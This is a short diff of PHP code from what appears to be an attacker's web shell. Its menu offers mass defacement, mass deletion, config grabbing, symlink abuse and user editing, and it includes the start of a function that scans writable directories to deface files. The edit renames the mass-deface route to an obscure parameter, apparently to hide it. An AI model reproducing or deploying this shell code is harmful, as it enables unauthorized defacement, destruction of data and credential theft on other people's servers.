@@ -237,7 +237,7 @@ echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>Zone-h</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=sym'>Symlink</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=asokoe'>Mass_deface</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config_grab</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>auto_edit_user</a>";
@@ -300,7 +300,7 @@ if($_GET['to'] == 'zoneh') {
 		</form>";
 	}
 	echo "</center>";
-} elseif($_GET['to'] == 'mass') {
+} elseif($_GET['to'] == 'asokoe') {
 	function sabun_massal($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
